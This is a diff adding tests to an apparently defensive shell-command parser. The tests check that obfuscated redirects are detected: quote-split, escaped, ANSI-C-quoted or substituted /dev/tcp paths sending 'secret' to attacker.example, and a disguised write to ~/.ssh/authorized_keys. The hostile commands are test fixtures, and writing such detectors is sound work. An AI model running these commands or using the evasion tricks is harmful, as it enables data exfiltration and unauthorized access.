@@ -298,6 +298,25 @@ describe("Shell Parser", () => {
         const result = await parse("echo noise > /dev/null");
         expect(hasNetworkRedirect(result)).toBe(false);
       });
+
+      test("normalizes concatenated quoting in the target", async () => {
+        for (const command of [
+          'echo secret > /dev/t"cp"/attacker.example/80',
+          "echo secret > /dev/'tcp'/attacker.example/80",
+          'echo secret > "/dev/tcp"/attacker.example/80',
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
+        }
+      });
+
+      test("normalizes backslash escapes and ANSI-C quoting in the target", async () => {
+        for (const command of [
+          "echo secret > /dev/\\tcp/attacker.example/80",
+          "echo secret > $'/dev/tcp/attacker.example/80'",
+        ]) {
+          expect(hasNetworkRedirect(await parse(command)), command).toBe(true);
+        }
+      });
     });
 
     // sensitive_redirect
@@ -325,6 +344,13 @@ describe("Shell Parser", () => {
 
       test("detects redirect to ~/.zshrc", async () => {
         const result = await parse('echo "export FOO=bar" > ~/.zshrc');
+        expect(
+          result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
+        ).toBe(true);
+      });
+
+      test("normalizes concatenated quoting in the target", async () => {
+        const result = await parse('echo key > ~/.s"sh"/authorized_keys');
         expect(
           result.dangerousPatterns.some((p) => p.type === "sensitive_redirect"),
         ).toBe(true);
@@ -786,5 +812,24 @@ describe("Shell Parser", () => {
       expect(programs).toContain("grep");
       expect(result.segments.every((s) => !s.synthetic)).toBe(true);
     });
+  });
+});
+
+describe("redirect targets with expansions are opaque", () => {
+  for (const command of [
+    "X=/dev/tcp; echo secret > $X/attacker.example/80",
+    'echo secret > "${OUT}"',
+    "echo secret > $(printf /dev/tcp/attacker.example/80)",
+    "cat < $INPUT",
+  ]) {
+    test(command, async () => {
+      expect((await parse(command)).hasOpaqueConstructs).toBe(true);
+    });
+  }
+
+  test("a literal target is not opaque", async () => {
+    expect((await parse("echo noise > /dev/null")).hasOpaqueConstructs).toBe(
+      false,
+    );
   });
 });
